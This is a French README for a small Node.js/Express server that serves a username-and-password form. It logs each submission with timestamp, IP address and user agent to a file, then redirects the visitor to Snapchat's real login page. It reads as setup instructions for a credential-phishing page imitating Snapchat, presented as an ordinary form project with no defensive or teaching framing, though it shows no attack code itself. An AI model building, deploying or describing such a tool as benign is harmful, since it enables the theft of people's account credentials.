# Projet Express - Formulaire de Soumission

Ce projet utilise Node.js et Express pour créer un serveur web simple qui traite les données d'un formulaire. Les informations soumises sont enregistrées dans un fichier journal et l'utilisateur est redirigé vers le site de connexion Snapchat.

## Prérequis

- Node.js installé sur votre machine
- npm (Node Package Manager)

## Installation

1. Clonez le dépôt :
   ```bash
   git clone https://votre-repo.git
   cd votre-repo
   ```

2. Installez les dépendances :
   ```bash
   npm install express
   ```

## Utilisation

1. Démarrez le serveur :
   ```bash
   node index.js
   ```

2. Accédez à l'application via votre navigateur à l'adresse suivante :
   ```
   http://localhost:3000
   ```

3. Remplissez le formulaire avec votre nom d'utilisateur et votre mot de passe, puis soumettez.

## Fonctionnalités

- **Middleware** : Utilisation d'Express pour gérer le parsing des données POST.
- **Fichiers statiques** : Servir des fichiers HTML, CSS et images depuis le répertoire `public`.
- **Journalisation** : Les données du formulaire sont enregistrées dans `logs.txt` avec l'horodatage, l'adresse IP et l'agent utilisateur.
- **Redirection** : Après soumission, l'utilisateur est redirigé vers le site de connexion Snapchat.
